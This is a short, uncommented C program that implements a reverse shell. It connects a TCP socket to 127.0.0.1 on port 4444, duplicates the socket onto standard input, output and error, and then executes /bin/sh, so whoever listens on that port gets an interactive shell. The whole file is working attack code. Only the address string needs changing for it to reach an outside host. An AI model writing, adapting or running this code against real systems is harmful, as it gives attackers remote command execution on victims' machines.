#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
  struct sockaddr_in addr;
  unsigned short port = 4444;
  int s;

  s = socket(AF_INET, SOCK_STREAM, 6);

  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = inet_addr("127.0.0.1");

  connect(s, (struct sockaddr *)&addr, sizeof(addr));

  dup2(s, 0);
  dup2(s, 1);
  dup2(s, 2);

  char *argv[] = {"/bin/sh", NULL};

  execve(argv[0], &argv[0], NULL);

  return 0;
}
